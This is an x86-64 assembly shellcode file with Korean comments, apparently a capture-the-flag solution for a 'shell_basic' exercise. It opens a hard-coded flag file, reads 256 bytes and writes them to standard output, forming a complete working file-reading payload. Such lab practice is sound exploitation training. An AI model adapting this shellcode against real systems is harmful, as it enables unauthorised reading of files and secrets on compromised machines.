BITS 64
global _start

_start:
    ; -------------------------
    ; 1. open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY)
    ; -------------------------
    ; 스택에 문자열 뒤집어서 push (리틀엔디안)
    ; null 종료 포함
    ; 2F 68 6F 6D 65 2F 73 68 
    ; 65 6C 6C 5F 62 61 73 69
    ; 63 2F 66 6C 61 67 5F 6E 
    ; 61 6D 65 5F 69 73 5F 6C 
    ; 6F 6F 6F 6F 6F 6F 6E 67
push 0x0
mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax,  0x697361625f6c6c65
push rax
mov rax,  0x68732f656d6f682f
push rax
mov rdi, rsp ; ; rsi = "/home/shell_basic/flag_name_is_loooooong"
xor rsi, rsi ;rsi를 0으로 초기화 (읽기 전용)
xor rdx, rdx ;rdx를 0으로 초기화 (파일 모드)
mov rax, 2 ;sys_open 호출을 위해 rax에 2를 저장
syscall ;시스템 콜 호출
; rax에 반환되는 fd 저장 됨
; file *fd = open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY);

mov rdi, rax ; fd를 rdi에 저장 (파일 디스크립터)
mov rsi, rsp ; rsi에 스택 포인터를 저장 (파일 디스크립터를 읽을 버퍼로 사용)
sub rsp, 0x100
mov rdx, 0x100 ; 읽을 바이트 수를 256으로 설정
mov rax, 0 ; sys_read 호출을 위해 rax에 0를 저장
syscall ; 시스템 콜 호출
; rax에 읽은 바이트 수가 저장됨

mov rdi, 1
mov rax, 1 ; sys_write 호출을 위해 rax에 1을 저장
syscall ; 시스템 콜 호출
